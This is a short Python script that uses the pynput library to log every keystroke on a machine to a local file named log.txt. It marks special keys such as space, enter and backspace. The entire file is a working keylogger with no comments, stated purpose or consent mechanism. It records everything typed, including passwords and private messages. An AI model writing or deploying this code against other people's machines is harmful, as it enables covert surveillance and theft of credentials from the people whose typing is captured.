from pynput.keyboard import Listener

def write_to_file(key):
    with open("log.txt", "a") as log_file:
        try:
            char = key.char
            log_file.write(char)
        except AttributeError:
            if str(key) == "Key.space":
                log_file.write(" ")
            elif str(key) == "Key.enter":
                log_file.write("\n")
            elif str(key) == "Key.backspace":
                log_file.write("[BACKSPACE]")
            else:
                log_file.write(f"[{key}]")

def main():
    with Listener(on_press=write_to_file) as listener:
        listener.join()

if __name__ == "__main__":
    main()